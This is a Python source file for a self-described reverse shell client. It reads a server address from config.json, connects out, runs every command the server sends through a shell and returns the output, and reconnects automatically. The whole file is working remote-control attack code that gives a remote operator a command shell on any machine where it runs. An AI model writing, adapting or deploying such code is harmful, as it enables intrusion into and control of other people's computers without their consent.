import socket
import os
import subprocess
import datetime
import json
import time
import sys

# Load configuration from config.json
def load_config():
    try:
        with open("config.json", "r") as config_file:
            config = json.load(config_file)
            log_message("Configuration loaded from config.json")
            return config
    except FileNotFoundError:
        log_message("config.json not found, using default values", "WARNING")
        return None
    except json.JSONDecodeError as e:
        log_message(f"Invalid JSON in config file: {e}", "ERROR")
        return None
    except Exception as e:
        log_message(f"Error loading config: {e}", "ERROR")
        return None

# Simple logging function
def log_message(message, level="INFO"):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] [{level}] {message}\n"
    
    # Write to log file
    try:
        with open("client.log", "a") as log_file:
            log_file.write(log_entry)
    except:
        pass  # Silently fail if can't write logs

# Display countdown with live updates
def countdown_display(seconds, message="Retrying"):
    try:
        for i in range(seconds, 0, -1):
            # Display countdown on same line
            sys.stdout.write(f"\r{message} in {i} seconds...")
            sys.stdout.flush()
            time.sleep(1)
        # Clear the line and move to next
        sys.stdout.write("\r" + " " * 50 + "\r")
        sys.stdout.flush()
    except KeyboardInterrupt:
        # User pressed Ctrl+C during countdown
        sys.stdout.write("\r" + " " * 50 + "\r")
        sys.stdout.flush()
        raise

# Connect to server
def connect_to_server(host, port):
    try:
        s = socket.socket()
        log_message(f"Attempting to connect to {host}:{port}")
        s.connect((host, port))
        log_message(f"Connected successfully to {host}:{port}")
        return s
    except socket.error as e:
        log_message(f"Connection failed: {str(e)}", "ERROR")
        return None
    except Exception as e:
        log_message(f"Unexpected error during connection: {str(e)}", "ERROR")
        return None

# Execute commands received from server
def execute_commands(s):
    try:
        while True:
            try:
                # Receive data from server
                data = s.recv(1024)
                
                if not data:
                    log_message("No data received, connection may be closed", "WARNING")
                    break
                
                # Handle directory change command
                if data[:2].decode("utf-8") == 'cd':
                    try:
                        os.chdir(data[3:].decode("utf-8"))
                        log_message(f"Changed directory to: {os.getcwd()}")
                    except Exception as e:
                        log_message(f"Failed to change directory: {str(e)}", "ERROR")
                        error_msg = f"Error: {str(e)}\n"
                        s.send(str.encode(error_msg + os.getcwd() + "> "))
                        continue
                
                # Execute command
                if len(data) > 0:
                    try:
                        cmd_str = data[:].decode("utf-8")
                        log_message(f"Executing command: {cmd_str}")
                        
                        cmd = subprocess.Popen(
                            cmd_str, 
                            shell=True,
                            stdout=subprocess.PIPE,
                            stdin=subprocess.PIPE,
                            stderr=subprocess.PIPE
                        )
                        
                        output_byte = cmd.stdout.read() + cmd.stderr.read()
                        output_str = str(output_byte, "utf-8")
                        currentWD = os.getcwd() + "> "
                        
                        # Send response back to server
                        s.send(str.encode(output_str + currentWD))
                        log_message(f"Command executed successfully")
                        
                    except Exception as e:
                        log_message(f"Error executing command: {str(e)}", "ERROR")
                        error_msg = f"Error executing command: {str(e)}\n"
                        try:
                            s.send(str.encode(error_msg + os.getcwd() + "> "))
                        except:
                            log_message("Failed to send error message to server", "ERROR")
                            break
                            
            except socket.error as e:
                log_message(f"Socket error in command loop: {str(e)}", "ERROR")
                break
            except Exception as e:
                log_message(f"Unexpected error in command loop: {str(e)}", "ERROR")
                break
                
    except KeyboardInterrupt:
        log_message("Client interrupted by user", "WARNING")
    except Exception as e:
        log_message(f"Error in execute_commands: {str(e)}", "ERROR")
    finally:
        try:
            s.close()
            log_message("Connection closed")
        except:
            pass

def main():
    # Try to load configuration
    config = load_config()
    
    if config and "client" in config:
        # Use values from config file
        host = config["client"].get("server_ip", "127.0.0.1")
        port = config["client"].get("server_port", 9999)
        reconnect_enabled = config["client"].get("reconnect_enabled", False)
        reconnect_delay = config["client"].get("reconnect_delay", 5)
        max_attempts = config["client"].get("max_reconnect_attempts", 0)
    else:
        # Fallback to default values
        host = "127.0.0.1"
        port = 9999
        reconnect_enabled = False
        reconnect_delay = 5
        max_attempts = 0
        log_message("Using default configuration", "WARNING")
    
    log_message("=" * 50)
    log_message("Reverse Shell Client Starting...")
    log_message("=" * 50)
    
    attempt = 0
    
    # Main connection loop with Ctrl+C handling
    try:
        while True:
            attempt += 1
            
            # Check if we've exceeded max attempts
            if max_attempts > 0 and attempt > max_attempts:
                log_message(f"Maximum reconnection attempts ({max_attempts}) reached. Exiting...", "ERROR")
                break
            
            # Show attempt number if reconnecting
            if attempt > 1:
                log_message(f"Reconnection attempt #{attempt}")
            
            log_message(f"Attempting to connect to {host}:{port}")
            
            # Try to connect
            s = connect_to_server(host, port)
            
            if s is not None:
                # Connection successful
                log_message("Connection established successfully")
                attempt = 0  # Reset attempt counter
                
                # Execute commands
                execute_commands(s)
                
                # If we reach here, connection was lost during operation
                log_message("Connection lost", "WARNING")
                
                # Check if reconnect is enabled
                if not reconnect_enabled:
                    log_message("Auto-reconnect is disabled. Exiting...", "WARNING")
                    break
                
                # Wait before reconnecting with countdown
                log_message(f"Reconnecting in {reconnect_delay} seconds...")
                countdown_display(reconnect_delay, "Reconnecting")
            else:
                # Connection failed
                if not reconnect_enabled:
                    log_message("Failed to connect to server. Exiting...", "ERROR")
                    break
                
                # Show retry information
                if max_attempts == 0:
                    log_message(f"Connection failed. Unlimited retries enabled.", "WARNING")
                else:
                    remaining = max_attempts - attempt
                    log_message(f"Connection failed. {remaining} attempt(s) remaining.", "WARNING")
                
                # Wait before retrying with countdown
                countdown_display(reconnect_delay, "Retrying")
                
    except KeyboardInterrupt:
        log_message("\nClient interrupted by user (Ctrl+C)", "WARNING")
    
    log_message("Client shutting down...")

if __name__ == "__main__":
    main()
